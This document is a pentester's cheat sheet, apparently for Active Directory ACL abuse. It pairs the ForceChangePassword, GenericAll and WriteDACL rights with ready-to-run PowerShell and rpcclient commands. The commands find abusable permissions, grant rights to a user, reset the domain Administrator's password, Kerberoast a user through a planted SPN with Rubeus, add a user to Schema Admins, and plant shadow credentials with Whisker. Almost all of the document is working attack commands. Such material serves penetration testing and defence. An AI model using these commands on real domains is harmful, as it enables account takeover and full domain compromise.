# ForceChangePassword
```
GUID: 00299570-246d-11d0-a768-00aa006e0529
Event IDs 4723, 4724
```

#### Add ForceChangePassword ExtendedRights
```powershell
Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights ResetPassword
```

#### All User
```powershell
Get-DomainObjectAcl | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
```

#### Specific User
```powershell
Get-DomainObjectAcl  -Identity Administrator | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
```

#### Change Password
```powershell
net user Administrator YeniSifre123! /domain
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
```

#### Change Password with RPC
```powershell
rpcclient $> setuserinfo2 Administrator 24 'NewPassword123!'
```
---

# GenericAll
```
AccessMask = 0x000f01ff ( 983551 )
```

#### Add GenericAll
```powershell
Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights All
```

#### All user
```powershell
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},@{Name="ObjectSid"; Expression={Convert-SidToName $_.ObjectSid}},ActiveDirectoryRights -Unique
```

#### Specific User
```powershell
Get-DomainObjectAcl -Identity jkimmich | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},ActiveDirectoryRights -Unique
```

#### Change Password
```powershell
net user Administrator YeniSifre123! /domain
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
```

#### Targeted Kerberos
```powershell
Set-DomainObject -Identity jkimmich -Set @{serviceprincipalname='pentest/Oxsium'}
.\Rubeus.exe kerberoast /user:jkimmich /nowrap
```

#### Add to Group ( GenericAll on "Schema Admins" group )
```powershell
Add-DomainGroupMember -Identity "Schema Admins" -Members "jkimmich"
net group "Schema Admins" jkimmich /add /domain
```

#### DACL Abuse
```powershell
Add-DomainObjectAcl -TargetIdentity jkimmich -PrincipalIdentity User_B -Rights GenericAll
```

#### Shadow Credentials
```powershell
.\Whisker.exe add /target:jkimmich /domain:warzone.oxsium.local /dc:WIN-WARZONE.warzone.oxsium.local
```
---

# WriteDACL
```
Access Mask: 0x40000
```

#### All user
```powershell
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -eq "WriteDACL"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},@{Name="ObjectSid"; Expression={Convert-SidToName $_.ObjectSid}},ActiveDirectoryRights -Unique
```

### Specific user
```powershell
Get-DomainObjectAcl -Identity jkimmich | Where-Object {$_.ActiveDirectoryRights -eq "WriteDACL"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},ActiveDirectoryRights -Unique
```
